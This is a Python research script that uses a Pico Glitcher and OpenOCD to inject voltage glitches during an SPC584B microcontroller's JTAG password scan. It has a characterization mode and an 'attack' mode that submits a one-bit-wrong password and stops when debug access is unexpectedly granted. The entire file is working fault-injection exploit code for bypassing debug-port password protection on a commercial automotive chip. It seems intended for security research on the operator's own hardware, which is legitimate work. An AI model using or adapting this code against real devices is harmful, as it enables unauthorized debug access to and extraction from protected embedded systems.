#!/usr/bin/env python3
"""Fault the SPC584B JTAG-password transaction without pausing the TAP.

The experiment sends one uninterrupted 256-bit password scan. The Pico
Glitcher counts TCK edges from the start of that scan and fires early enough
for a delayed pulse to land before, during, or after the final scan clocks.

Two explicit modes are provided:

* characterize: send the correct password and stop on the first changed result;
* attack: send a one-bit-wrong password and stop on unexpected debug access.

This script never writes flash, UTEST, DCF, lifecycle, or OTP. Results are
printed to stdout; there is deliberately no campaign database.
"""

from __future__ import annotations

import argparse
from collections import deque
from dataclasses import dataclass
import os
from pathlib import Path
import random
import re
import shutil
import socket
import stat
import struct
import subprocess
import sys
import threading
import time

from findus import PicoGlitcher
from findus.pyboard import PyboardError


EXPECTED_IDCODE = 0x20144041
PASS_LCSTAT = 0xF7FF4000
PASSWORD_BYTES = 32
PASSWORD_INSTRUCTION = 0x07
DCI_CONTROL_INSTRUCTION = 0x0E
DCI_DESTRUCTIVE_RESET = 1 << 8
RPC_TOKEN = b"\x1a"
TRIGGER_TIMEOUT_MARKER = "Function execution timed out!"

EXIT_NO_CANDIDATE = 0
EXIT_ERROR = 2
EXIT_CANDIDATE = 10


class ExperimentError(RuntimeError):
    pass


@dataclass(frozen=True)
class Point:
    edge_count: int
    delay_ns: int
    length_ns: int
    repeat: int


@dataclass(frozen=True)
class Result:
    state: str
    detail: str

    @property
    def access_observed(self) -> bool:
        return self.state.startswith("ACCESS_")


class OpenOCDSession:
    """One bounded OpenOCD process with a local Tcl connection."""

    def __init__(self, executable: str, adapter_speed_khz: int):
        self.executable = executable
        self.adapter_speed_khz = adapter_speed_khz
        self.port = reserve_local_port()
        self.process: subprocess.Popen[str] | None = None
        self.sock: socket.socket | None = None
        self.output: deque[str] = deque(maxlen=1000)
        self.halted = False
        self.preserve_halt = False

    def command_line(self) -> list[str]:
        commands = [
            "bindto 127.0.0.1",
            "adapter driver ftdi",
            "ftdi vid_pid 0x263d 0x4001",
            "ftdi channel 0",
            "ftdi layout_init 0x0008 0x000b",
            "ftdi layout_signal nTRST -data 0x0100 -oe 0x0100",
            "ftdi layout_signal nSRST -ndata 0x2000 -oe 0x2000",
            f"adapter speed {self.adapter_speed_khz}",
            "transport select jtag",
            "reset_config trst_and_srst",
            (
                "jtag newtap spc584b tap -irlen 6 "
                f"-expected-id 0x{EXPECTED_IDCODE:08x}"
            ),
            (
                "target create spc584b.cpu powerpc -endian big "
                "-chain-position spc584b.tap"
            ),
            "gdb_port disabled",
            "telnet_port disabled",
            f"tcl_port {self.port}",
        ]
        command = [self.executable]
        for item in commands:
            command.extend(("-c", item))
        return command

    def _collect_output(self) -> None:
        assert self.process is not None and self.process.stdout is not None
        for line in self.process.stdout:
            self.output.append(line)

    def __enter__(self) -> "OpenOCDSession":
        self.process = subprocess.Popen(
            self.command_line(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self._collect_output, daemon=True).start()

        try:
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                if self.process.poll() is not None:
                    raise ExperimentError(
                        "OpenOCD exited during startup:\n" + "".join(self.output)
                    )
                try:
                    self.sock = socket.create_connection(
                        ("127.0.0.1", self.port), timeout=0.5
                    )
                    self.sock.settimeout(10)
                    break
                except OSError:
                    time.sleep(0.05)
            else:
                raise ExperimentError("timed out waiting for OpenOCD")

            self.command("init")
            self.command("poll off")
            return self
        except Exception:
            self.close()
            raise

    def rpc(self, script: str) -> str:
        if self.sock is None:
            raise ExperimentError("OpenOCD Tcl connection is unavailable")
        self.sock.sendall(script.encode() + RPC_TOKEN)
        chunks: list[bytes] = []
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ExperimentError("OpenOCD closed the Tcl connection")
            if RPC_TOKEN in chunk:
                before, _, _ = chunk.partition(RPC_TOKEN)
                chunks.append(before)
                return b"".join(chunks).decode(errors="replace")
            chunks.append(chunk)

    def command(self, command: str, label: str | None = None) -> str:
        response = self.rpc(
            f"set __spc_rc [catch {{{command}}} __spc_msg]; "
            "list $__spc_rc $__spc_msg"
        ).strip()
        match = re.match(r"^(-?\d+)(?:\s+(.*))?$", response, re.DOTALL)
        if not match:
            raise ExperimentError(f"unexpected OpenOCD response: {response!r}")
        message = (match.group(2) or "").strip()
        if len(message) >= 2 and message[0] == "{" and message[-1] == "}":
            message = message[1:-1]
        if match.group(1) != "0":
            raise ExperimentError(
                f"OpenOCD command failed: {label or command}\n{message}"
            )
        return message

    def read_word(self, address: int) -> int:
        response = self.command(f"read_memory 0x{address:08x} 32 1")
        words = re.findall(r"(?:0x[0-9a-fA-F]+)|(?:\b[0-9]+\b)", response)
        if len(words) != 1:
            raise ExperimentError(
                f"read at 0x{address:08x} returned {len(words)} words"
            )
        return int(words[0], 0) & 0xFFFFFFFF

    def close(self) -> None:
        if self.sock is not None:
            if self.halted and not self.preserve_halt:
                try:
                    self.command("resume")
                except Exception:
                    pass
            try:
                self.rpc("shutdown")
            except Exception:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

        if self.process is not None:
            try:
                self.process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.process.terminate()
                try:
                    self.process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self.process.kill()
            self.process = None

    def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
        self.close()


def reserve_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def compact_error(error: Exception) -> str:
    return " | ".join(line.strip() for line in str(error).splitlines() if line.strip())


def find_openocd() -> str:
    configured = os.environ.get("SPC_OPENOCD")
    if not configured:
        raise ExperimentError(
            "SPC_OPENOCD must point to ST's openocd-automotive-mcu-r1 build"
        )
    executable = shutil.which(configured)
    if executable is None:
        raise ExperimentError(f"OpenOCD not found: {configured}")

    try:
        probe = subprocess.run(
            [executable, "-c", "target types", "-c", "shutdown"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as error:
        raise ExperimentError(f"could not validate OpenOCD: {error}") from error
    if probe.returncode != 0:
        raise ExperimentError(
            f"OpenOCD capability check exited with status {probe.returncode}"
        )
    if "powerpc" not in f"{probe.stdout}\n{probe.stderr}".split():
        raise ExperimentError("SPC_OPENOCD does not provide the powerpc target")
    return executable


def read_password(path: Path) -> bytes:
    try:
        password = path.read_bytes()
        mode = stat.S_IMODE(path.stat().st_mode)
    except OSError as error:
        raise ExperimentError(f"cannot read password file {path}: {error}") from error
    if len(password) != PASSWORD_BYTES:
        raise ExperimentError(f"password file must be exactly {PASSWORD_BYTES} bytes")
    if password in (b"\x00" * PASSWORD_BYTES, b"\xff" * PASSWORD_BYTES):
        raise ExperimentError("refusing an all-zero or all-0xff password")
    if mode & 0o077:
        raise ExperimentError(
            f"password file permissions are {mode:04o}; run: chmod 600 {path}"
        )
    return password


def password_words(password: bytes, *, wrong: bool) -> tuple[int, ...]:
    value = bytearray(password)
    if wrong:
        value[0] ^= 0x01
    return struct.unpack(">8I", value)


def password_scan_command(words: tuple[int, ...]) -> str:
    if len(words) != 8:
        raise ExperimentError("JTAG password must contain eight words")
    fields = " ".join(f"32 0x{word:08x}" for word in words)
    return f"drscan spc584b.tap {fields}"


def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
    session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
    session.command(
        f"drscan spc584b.tap 32 0x{DCI_DESTRUCTIVE_RESET:08x}"
    )
    time.sleep(hold_ms / 1000)
    session.command(f"irscan spc584b.tap 0x{DCI_CONTROL_INSTRUCTION:02x}")
    session.command("drscan spc584b.tap 32 0x00000000")


def select_password_register(session: OpenOCDSession) -> None:
    session.command(f"irscan spc584b.tap 0x{PASSWORD_INSTRUCTION:02x}")


def wait_for_trigger(glitcher: PicoGlitcher, timeout: float) -> bool:
    try:
        glitcher.block(timeout=timeout)
    except PyboardError as error:
        message = " ".join(
            item.decode(errors="replace") if isinstance(item, bytes) else str(item)
            for item in error.args
        )
        if TRIGGER_TIMEOUT_MARKER in message:
            return False
        raise
    return True


def probe_debug(session: OpenOCDSession, halt_timeout_ms: int) -> Result:
    try:
        session.command("halt 0")
        session.command(f"wait_halt {halt_timeout_ms}")
        session.halted = True
    except ExperimentError as error:
        session.halted = False
        return Result("LOCKED_OR_UNRESPONSIVE", compact_error(error))

    try:
        registers = session.command("get_reg -force {pc msr r0}")
        target_state = session.command("spc584b.cpu curstate")
        lcstat = session.read_word(PASS_LCSTAT)
    except ExperimentError as error:
        return Result("ACCESS_UNVERIFIED", compact_error(error))

    jun = 1 if lcstat & (1 << 30) else 0
    detail = (
        f"registers={registers};state={target_state};jun={jun};lc={lcstat & 0x7}"
    )
    state = "ACCESS_JUN_SET" if jun else "ACCESS_JUN_CLEAR"
    return Result(state, detail)


def submit_without_glitch(
    openocd: str,
    words: tuple[int, ...],
    args: argparse.Namespace,
) -> Result:
    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
        reset_target(session, args.reset_hold_ms)
        select_password_register(session)
        session.command(
            password_scan_command(words),
            "<redacted uninterrupted 256-bit JTAG password scan>",
        )
        return probe_debug(session, args.control_halt_timeout_ms)


def run_controls(
    openocd: str,
    correct_words: tuple[int, ...],
    wrong_words: tuple[int, ...],
    args: argparse.Namespace,
) -> None:
    correct = submit_without_glitch(openocd, correct_words, args)
    print(f"CONTROL password=correct result={correct.state} detail={correct.detail}")
    if correct.state != "ACCESS_JUN_SET":
        raise ExperimentError(
            f"correct-password control failed without a glitch: {correct.state}"
        )

    wrong = submit_without_glitch(openocd, wrong_words, args)
    print(f"CONTROL password=wrong result={wrong.state} detail={wrong.detail}")
    if wrong.access_observed:
        raise ExperimentError(
            f"wrong-password control unexpectedly obtained access: {wrong.state}"
        )


def run_glitched_submission(
    openocd: str,
    glitcher: PicoGlitcher,
    words: tuple[int, ...],
    point: Point,
    args: argparse.Namespace,
) -> Result:
    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
        reset_target(session, args.reset_hold_ms)
        select_password_register(session)

        glitcher.edge_count_trigger(
            pin_trigger=args.trigger_input,
            number_of_edges=point.edge_count,
            edge_type="rising",
        )
        glitcher.arm(point.delay_ns, point.length_ns)

        scan_error: ExperimentError | None = None
        try:
            session.command(
                password_scan_command(words),
                "<redacted uninterrupted 256-bit JTAG password scan>",
            )
        except ExperimentError as error:
            scan_error = error

        if not wait_for_trigger(glitcher, args.block_timeout):
            return Result("TRIGGER_TIMEOUT", TRIGGER_TIMEOUT_MARKER)

        result = probe_debug(session, args.halt_timeout_ms)
        if result.access_observed and args.mode == "attack":
            session.preserve_halt = True

        if scan_error is None:
            return result
        detail = f"scan_error={compact_error(scan_error)};probe={result.detail}"
        if result.access_observed:
            return Result(result.state, detail)
        return Result("SCAN_OR_TARGET_FAULT", detail)


def inclusive_values(bounds: tuple[int, int], step: int) -> range:
    low, high = bounds
    first = ((low + step - 1) // step) * step
    return range(first, high + 1, step)


def build_points(args: argparse.Namespace) -> list[Point]:
    points = [
        Point(edge, delay, length, repeat)
        for edge in range(args.edge_count[0], args.edge_count[1] + 1)
        for delay in inclusive_values(tuple(args.delay), args.step_ns)
        for length in inclusive_values(tuple(args.length), args.step_ns)
        for repeat in range(args.repeats)
    ]
    if not points:
        raise ExperimentError("the requested timing grid is empty")
    random.Random(args.seed).shuffle(points)
    if args.attempts:
        points = points[: args.attempts]
    return points


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--mode",
        required=True,
        choices=("characterize", "attack"),
        help=(
            "characterize faults a correct password; attack faults a one-bit-wrong "
            "password"
        ),
    )
    parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="32-byte SPC584B JTAG password file",
    )
    parser.add_argument(
        "--edge-count",
        nargs=2,
        type=int,
        default=(252, 260),
        metavar=("MIN", "MAX"),
        help=(
            "inclusive TCK edge-count range after arming (default: 252 260); "
            "confirm the mapping on an oscilloscope"
        ),
    )
    parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
    parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
    parser.add_argument("--step-ns", type=int, default=4)
    parser.add_argument(
        "--attempts",
        type=int,
        default=1000,
        help="maximum shuffled attempts; 0 runs the complete grid",
    )
    parser.add_argument("--repeats", type=int, default=1)
    parser.add_argument("--seed", type=int, default=584)
    parser.add_argument(
        "--trigger-input",
        default="default",
        choices=("default", "alt", "ext1", "ext2"),
    )
    parser.add_argument("--adapter-speed-khz", type=int, default=1000)
    parser.add_argument("--reset-hold-ms", type=int, default=50)
    parser.add_argument("--halt-timeout-ms", type=int, default=100)
    parser.add_argument("--control-halt-timeout-ms", type=int, default=2000)
    parser.add_argument("--block-timeout", type=float, default=2.0)
    parser.add_argument(
        "--high-power",
        action="store_true",
        help="use the high-power crowbar only after validating it on a scope",
    )
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    for name in ("edge_count", "delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ExperimentError(f"invalid --{name.replace('_', '-')} range")
    if args.edge_count[0] < 1:
        raise ExperimentError("--edge-count values must be positive")
    if args.step_ns <= 0:
        raise ExperimentError("--step-ns must be positive")
    if args.attempts < 0:
        raise ExperimentError("--attempts cannot be negative")
    if args.repeats <= 0:
        raise ExperimentError("--repeats must be positive")
    if args.adapter_speed_khz <= 0:
        raise ExperimentError("--adapter-speed-khz must be positive")
    if args.reset_hold_ms < 0:
        raise ExperimentError("--reset-hold-ms cannot be negative")
    if args.halt_timeout_ms <= 0 or args.control_halt_timeout_ms <= 0:
        raise ExperimentError("halt timeouts must be positive")
    if args.block_timeout <= 0:
        raise ExperimentError("--block-timeout must be positive")


def main() -> int:
    args = parse_args()
    try:
        validate_args(args)
        openocd = find_openocd()
        password = read_password(args.password_file)
        correct_words = password_words(password, wrong=False)
        wrong_words = password_words(password, wrong=True)

        glitcher = PicoGlitcher()
        try:
            glitcher.init(port=args.rpico, enable_vtarget=False)
        except SystemExit as error:
            raise ExperimentError(
                f"PicoGlitcher initialization exited with status {error.code}"
            ) from error

        frequency_hz = int(glitcher.get_cpu_frequency())
        if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
            raise ExperimentError(
                f"unsupported PicoGlitcher frequency: {frequency_hz} Hz"
            )
        tick_ns = 1_000_000_000 // frequency_hz
        if args.step_ns % tick_ns:
            raise ExperimentError(
                f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
            )

        if args.high_power:
            glitcher.set_hpglitch()
        else:
            glitcher.set_lpglitch()

        points = build_points(args)
        print(f"MODE={args.mode}", flush=True)
        print("PASSWORD_SCAN=UNINTERRUPTED_256_BIT_DRSCAN", flush=True)
        print("TRIGGER_REFERENCE=TCK_EDGES_AFTER_PASSWORD_IR_SELECTION", flush=True)
        print("EDGE_MAPPING_REQUIRES_OSCILLOSCOPE=yes", flush=True)
        print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)
        print(f"POINTS_THIS_RUN={len(points)}", flush=True)

        run_controls(openocd, correct_words, wrong_words, args)

        words = correct_words if args.mode == "characterize" else wrong_words
        started = time.monotonic()
        for attempt, point in enumerate(points):
            result = run_glitched_submission(
                openocd, glitcher, words, point, args
            )
            elapsed = max(time.monotonic() - started, 0.001)
            print(
                f"ATTEMPT={attempt} edge_count={point.edge_count} "
                f"delay_ns={point.delay_ns} length_ns={point.length_ns} "
                f"repeat={point.repeat} result={result.state} "
                f"rate={(attempt + 1) / elapsed:.2f}/s detail={result.detail}",
                flush=True,
            )

            if result.state == "TRIGGER_TIMEOUT":
                raise ExperimentError(
                    f"edge count {point.edge_count} was not observed during the scan"
                )

            if args.mode == "attack" and result.access_observed:
                print(
                    "EXPERIMENT_RESULT=ACCESS_CANDIDATE "
                    f"edge_count={point.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat}",
                    flush=True,
                )
                print("DEVICE_LEFT_HALTED_WITHOUT_RESET=yes", flush=True)
                return EXIT_CANDIDATE

            if args.mode == "characterize" and result.state != "ACCESS_JUN_SET":
                print(
                    "EXPERIMENT_RESULT=FAULT_OBSERVED "
                    f"edge_count={point.edge_count} delay_ns={point.delay_ns} "
                    f"length_ns={point.length_ns} repeat={point.repeat} "
                    f"result={result.state}",
                    flush=True,
                )
                print(
                    "INTERPRETATION=physical_effect_not_password_compare_proof",
                    flush=True,
                )
                return EXIT_CANDIDATE

        final = (
            "NO_FAULT_OBSERVED"
            if args.mode == "characterize"
            else "NO_ACCESS_OBSERVED"
        )
        print(f"EXPERIMENT_RESULT={final}", flush=True)
        return EXIT_NO_CANDIDATE
    except KeyboardInterrupt:
        print("\nEXPERIMENT_RESULT=INTERRUPTED", flush=True)
        return 130
    except Exception as error:
        print(
            f"EXPERIMENT_RESULT=ERROR type={type(error).__name__} reason={error}",
            file=sys.stderr,
            flush=True,
        )
        return EXIT_ERROR


if __name__ == "__main__":
    raise SystemExit(main())
